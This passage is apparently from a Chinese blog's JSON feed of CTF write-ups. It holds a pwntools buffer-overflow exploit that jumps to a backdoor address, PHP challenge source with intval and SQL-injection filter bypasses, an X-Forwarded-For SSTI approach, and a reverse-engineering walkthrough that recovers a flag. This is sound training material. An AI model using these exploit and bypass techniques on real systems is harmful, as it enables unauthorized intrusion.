data-src=\"https://i.loli.net/2021/01/26/BNTLOps68XFk7Ht.png\" alt=\"\" /></p>\n<p>v5 的可用栈大小为 0x40<br />\n 可以看出，这个 gets 绝对有问题；</p>\n<p>程序存在后门:</p>\n<p><img data-src=\"https://i.loli.net/2021/01/26/OR51iljEJaZWY7p.png\" alt=\"\" /></p>\n<p>sub_40060D 的地址为 0x40060D</p>\n<p>下面我们可以写个脚本跑出 flag;<br />\n 在此之前我们知道 v5 的栈大小为 0x40, 但还需要加上返回值的 8 个字符；<br />\n 最终为 0x48.</p>\n<div class=\"note info\">\n<p>构造 exp</p>\n</div>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"node3.buuoj.cn\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">28395</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x48</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x40060D</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"https://i.loli.net/2021/01/26/SrE8Q7LZpRatNkH.png\" alt=\"\" /></p>\n<p>得到 flag:</p>\n<p class=\"bulr\">!! flag{a15dd406-0d79-4f49-b5a0-3dde546a4d3d}! !</p>\n",
            "tags": [
                "wp",
                "pwn"
            ]
        },
        {
            "id": "http://kyrita.top/ctf-show-%E8%90%8C%E6%96%B0%E8%AE%A1%E5%88%921-7/",
            "url": "http://kyrita.top/ctf-show-%E8%90%8C%E6%96%B0%E8%AE%A1%E5%88%921-7/",
            "title": "ctf.show-萌新web1-4",
            "date_published": "2021-01-24T02:48:40.021Z",
            "content_html": "<p>简单记录 sql 绕过方法<br />\n<a id=\"more\"></a></p>\n<h1 id=\"question1\"><a class=\"anchor\" href=\"#question1\">#</a> Question1</h1>\n<h2 id=\"源码\"><a class=\"anchor\" href=\"#源码\">#</a> 源码:</h2>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>ctf.show萌新计划web1<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">charset</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>utf-8<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token prolog\">&lt;?php</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># 包含数据库连接文件</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>include(\"config.php\");</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># 判断get提交的参数id是否存在</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>if(isset($_GET['id']))&#123;</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    $id = $_GET['id'];</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    # 判断id的值是否大于999</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    if(intval($id) > 999)&#123;</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        # id 大于 999 直接退出并返回错误</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        die(\"id error\");</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    &#125;else&#123;</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        # id 小于 999 拼接sql语句</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        $sql = \"select * from article where id = $id order by id limit 1 \";</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        echo \"执行的sql为：$sql&lt;br>\";</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        # 执行sql 语句</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        $result = $conn->query($sql);</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        # 判断有没有查询结果</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        if ($result->num_rows > 0) &#123;</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            # 如果有结果，获取结果对象的值$row</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>            while($row = $result->fetch_assoc()) &#123;</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>                echo \"id: \" . $row[\"id\"]. \" - title: \" . $row[\"title\"]. \" &lt;br>&lt;hr>\" . $row[\"content\"]. \"&lt;br>\";</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>            &#125;</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        &#125;</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        # 关闭数据库连接</pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        $conn->close();</pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    &#125;</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"34\"></td><td><pre>&#125;else&#123;</pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    highlight_file(__FILE__);</pre></td></tr><tr><td data-num=\"36\"></td><td><pre>&#125;</pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>?></span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token comment\">&lt;!-- flag in id = 1000 --></span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p>参考<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNjE3MDM0L2FydGljbGUvZGV0YWlscy85NDA0MDIxMg==\"> CG-CTF</span> 才知道这题考察的是 intval 漏洞，需要满足 id=1000，同时 intval ($id)&gt;999 要返回 false;</p>\n<p><span class=\"purple\">这里可以使用 '1000' 字符绕过，'1000' 进行 intval 后还是 1000 (&quot;1000&quot; 同理)</span></p>\n<p><span class=\"pink\">125&lt;&lt;3 也可以，而 8000&gt;&gt;3 却不行.</span></p>\n<p><span class=\"green\">当然可以使用 680|320 绕过</span></p>\n<p><span class=\"aqua\">也可以使用 hex (16 进制) 绕过：例如 0x3e8</span></p>\n<p><img data-src=\"https://i.loli.net/2021/01/24/laVFmL2G8YTKjky.png\" alt=\"\" /></p>\n<p>任意一种方法都可 get flag</p>\n<h1 id=\"question2\"><a class=\"anchor\" href=\"#question2\">#</a> Question2</h1>\n<h2 id=\"源码-2\"><a class=\"anchor\" href=\"#源码-2\">#</a> 源码</h2>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token prolog\">&lt;?php</pre></td></tr><tr><td data-num=\"2\"></td><td><pre># 包含数据库连接文件</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>include(\"config.php\");</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># 判断get提交的参数id是否存在</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>if(isset($_GET['id']))&#123;</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        $id = $_GET['id'];</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    if(preg_match(\"/or|\\+/i\",$id))&#123;</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>            die(\"id error\");</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    &#125;</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    # 判断id的值是否大于999</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    if(intval($id) > 999)&#123;</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        # id 大于 999 直接退出并返回错误</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        die(\"id error\");</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    &#125;else&#123;</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        # id 小于 999 拼接sql语句</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        $sql = \"select * from article where id = $id order by id limit 1 \";</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        echo \"执行的sql为：$sql&lt;br>\";</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        # 执行sql 语句</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        $result = $conn->query($sql);</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        # 判断有没有查询结果</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        if ($result->num_rows > 0) &#123;</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            # 如果有结果，获取结果对象的值$row</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            while($row = $result->fetch_assoc()) &#123;</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>                echo \"id: \" . $row[\"id\"]. \" - title: \" . $row[\"title\"]. \" &lt;br>&lt;hr>\" . $row[\"content\"]. \"&lt;br>\";</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            &#125;</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        &#125;</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        # 关闭数据库连接</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        $conn->close();</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    &#125;</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"31\"></td><td><pre>&#125;else&#123;</pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    highlight_file(__FILE__);</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>&#125;</pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>?></span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token comment\">&lt;!-- flag in id = 1000 --></span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><div class=\"note info\">\n<p>keycode：</p>\n</div>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>if(preg_match(\"/or|\\+/i\",$id))</pre></td></tr></table></figure><p>payload: 同样用 '1000' 绕过</p>\n<h1 id=\"question3\"><a class=\"anchor\" href=\"#question3\">#</a> Question3</h1>\n<h2 id=\"源码-3\"><a class=\"anchor\" href=\"#源码-3\">#</a> 源码</h2>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>ctf.show萌新计划web1<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">charset</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>utf-8<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token prolog\">&lt;?php</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># 包含数据库连接文件</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>include(\"config.php\");</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># 判断get提交的参数id是否存在</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>if(isset($_GET['id']))&#123;</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        $id = $_GET['id'];</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    if(preg_match(\"/or|\\-|\\\\|\\*|\\&lt;|\\>|\\!|x|hex|\\+/i\",$id))&#123;</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            die(\"id error\");</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    &#125;</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    # 判断id的值是否大于999</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    if(intval($id) > 999)&#123;</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        # id 大于 999 直接退出并返回错误</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        die(\"id error\");</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    &#125;else&#123;</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        # id 小于 999 拼接sql语句</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        $sql = \"select * from article where id = $id order by id limit 1 \";</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        echo \"执行的sql为：$sql&lt;br>\";</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        # 执行sql 语句</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        $result = $conn->query($sql);</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        # 判断有没有查询结果</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        if ($result->num_rows > 0) &#123;</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>            # 如果有结果，获取结果对象的值$row</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>            while($row = $result->fetch_assoc()) &#123;</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>                echo \"id: \" . $row[\"id\"]. \" - title: \" . $row[\"title\"]. \" &lt;br>&lt;hr>\" . $row[\"content\"]. \"&lt;br>\";</pre></td></tr><tr><td data-num=\"31\"></td><td><pre>            &#125;</pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        &#125;</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        # 关闭数据库连接</pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        $conn->close();</pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    &#125;</pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"37\"></td><td><pre>&#125;else&#123;</pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    highlight_file(__FILE__);</pre></td></tr><tr><td data-num=\"39\"></td><td><pre>&#125;</pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>?></span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token comment\">&lt;!-- flag in id = 1000 --></span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><div class=\"note info\">\n<p>keycode:</p>\n</div>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>if(preg_match(\"/or|\\-|\\\\|\\*|\\<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>|\\</span><span class=\"token punctuation\">></span></span>|\\!|x|hex|\\+/i\",$id))</pre></td></tr></table></figure><p>同理</p>\n<h1 id=\"question4\"><a class=\"anchor\" href=\"#question4\">#</a> Question4</h1>\n<h2 id=\"源码-4\"><a class=\"anchor\" href=\"#源码-4\">#</a> 源码</h2>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>ctf.show萌新计划web1<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">charset</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>utf-8<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token prolog\">&lt;?php</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># 包含数据库连接文件</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>include(\"config.php\");</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># 判断get提交的参数id是否存在</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>if(isset($_GET['id']))&#123;</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        $id = $_GET['id'];</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    if(preg_match(\"/or|\\-|\\\\\\|\\/|\\\\*|\\&lt;|\\>|\\!|x|hex|\\(|\\)|\\+|select/i\",$id))&#123;</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            die(\"id error\");</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    &#125;</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    # 判断id的值是否大于999</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    if(intval($id) > 999)&#123;</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        # id 大于 999 直接退出并返回错误</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        die(\"id error\");</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    &#125;else&#123;</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        # id 小于 999 拼接sql语句</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        $sql = \"select * from article where id = $id order by id limit 1 \";</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        echo \"执行的sql为：$sql&lt;br>\";</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        # 执行sql 语句</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        $result = $conn->query($sql);</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        # 判断有没有查询结果</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        if ($result->num_rows > 0) &#123;</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>            # 如果有结果，获取结果对象的值$row</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>            while($row = $result->fetch_assoc()) &#123;</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>                echo \"id: \" . $row[\"id\"]. \" - title: \" . $row[\"title\"]. \" &lt;br>&lt;hr>\" . $row[\"content\"]. \"&lt;br>\";</pre></td></tr><tr><td data-num=\"31\"></td><td><pre>            &#125;</pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        &#125;</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        # 关闭数据库连接</pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        $conn->close();</pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    &#125;</pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"37\"></td><td><pre>&#125;else&#123;</pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    highlight_file(__FILE__);</pre></td></tr><tr><td data-num=\"39\"></td><td><pre>&#125;</pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>?></span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token comment\">&lt;!-- flag in id = 1000 --></span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><div class=\"note info\">\n<p>keycode:</p>\n</div>\n<p>&lt;pre&gt;&lt;code&gt;<br />\nif(preg_match(&quot;/or|-|\\|/|\\*|&lt;|&gt;|!|x|hex|(|)|+|select/i&quot;,$id))<br />\n&lt;/code&gt;&lt;/pre&gt;</p>\n<p>payload: 使用 '1000'</p>\n",
            "tags": [
                "wp",
                "Web"
            ]
        },
        {
            "id": "http://kyrita.top/BJDCTF2020-The-mystery-of-ip/",
            "url": "http://kyrita.top/BJDCTF2020-The-mystery-of-ip/",
            "title": "BJDCTF2020-The mystery of ip",
            "date_published": "2021-01-22T02:22:19.668Z",
            "content_html": "<p>先进入题目给的靶机<br />\n<a id=\"more\"></a></p>\n<h1 id=\"审视页面\"><a class=\"anchor\" href=\"#审视页面\">#</a> 审视页面</h1>\n<p>发现左上角有两个标签: Flag 和 Hint;</p>\n<h2 id=\"hintphp\"><a class=\"anchor\" href=\"#hintphp\">#</a> Hint.php</h2>\n<p>给出提示从 IP 地址入手.<br />\n<img data-src=\"https://i.loli.net/2021/01/22/f2snd6E1rZ3pywv.png\" alt=\"\" /><br />\n 那我们就来看看第二个标签.</p>\n<h2 id=\"flagphp\"><a class=\"anchor\" href=\"#flagphp\">#</a> Flag.php</h2>\n<p>Flag 标签，打开后会给我们一份 IP 地址: 172.16.134.121;<br />\n 登录这个 IP 瞧瞧.</p>\n<p>使用 bp 抓取 Flag 页面的包；<br />\n<img data-src=\"https://i.loli.net/2021/01/22/yEoaLhXwBFuAg3N.png\" alt=\"\" /><br />\n 尝试更改一下 IP 地址看看？</p>\n<div class=\"note info\">\n<p>添加 X-Forwarded-For: 127.0.0.1</p>\n</div>\n<p><img data-src=\"https://i.loli.net/2021/01/22/qtWNdmsM8lYQCvb.png\" alt=\"\" /></p>\n<p>可以看到 IP 地址发生了变化，直接将 127.0.0.1 输出到了页面上；借助搜索引擎我发现一篇<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vd2FuZ3RhbnpoaS9wLzEyMjM4Nzc5Lmh0bWw=\">大佬的博客</span>，里面实际验证了这是一种 SSTI 模板注入；</p>\n<p>&lt;li&gt; 尝试构造 payload: &lt;/li&gt;</p>\n<p><img data-src=\"https://i.loli.net/2021/01/22/L7Kyc5H4ZSsqpAG.png\" alt=\"\" /><br />\n发现 flag 文件，利用 cat 拿取 flag;</p>\n<p>&lt;li&gt; 构造 payload: &lt;/li&gt;</p>\n<p><img data-src=\"https://i.loli.net/2021/01/22/ZfEkqNSDOgRCWl9.png\" alt=\"\" /></p>\n<p>于是拿到了 flag, 放入题目中 sumbit;yas</p>\n",
            "tags": [
                "wp",
                "Web"
            ]
        },
        {
            "id": "http://kyrita.top/EZre/",
            "url": "http://kyrita.top/EZre/",
            "title": "RE-新年快乐",
            "date_published": "2021-01-21T14:20:33.994Z",
            "content_html": "<h1 id=\"新年快乐\"><a class=\"anchor\" href=\"#新年快乐\">#</a> 新年快乐</h1>\n<p><a id=\"more\"></a></p>\n<p><img data-src=\"https://i.loli.net/2021/01/24/whsWzYRnkfVULpu.png\" alt=\"\" /></p>\n<p>是叫我们输入一个 flag, 看看就知道没什么卵用；</p>\n<p>拖进 IDA 后啥也没弄到，这时我就 (想到) 是不是需要脱壳？？</p>\n<h2 id=\"先脱壳\"><a class=\"anchor\" href=\"#先脱壳\">#</a> 先脱壳</h2>\n<p><img data-src=\"https://i.loli.net/2021/01/24/3CDRpBo5OWqVJrA.png\" alt=\"\" /></p>\n<p>将脱壳后的 exe 程序拖入 IDA 中；<br />\n 这时便可以看到脱掉壳的 exe 已经可以浏览函数了；<br />\nshift+F12 看一下</p>\n<p><img data-src=\"https://i.loli.net/2021/01/24/ZdnzfDQT4hG9PMs.png\" alt=\"\" /></p>\n<p>选中到 flag F5 跳转到函数页面分析得知是要我们输入一个字符串；</p>\n<p><img data-src=\"https://i.loli.net/2021/01/24/LnMOhdarKjwcJ4Y.png\" alt=\"\" /></p>\n<p>且字符串和 str2 比较，相同则得到 flag; 由此得知 flag=<span class=\"spoiler bulr\" title=\"快走开(╯▔皿▔)╯\">flag{HappyNewYear!}</span></p>\n",
            "tags": [
                "wp",
                "Re"
            ]
        }
    ]
}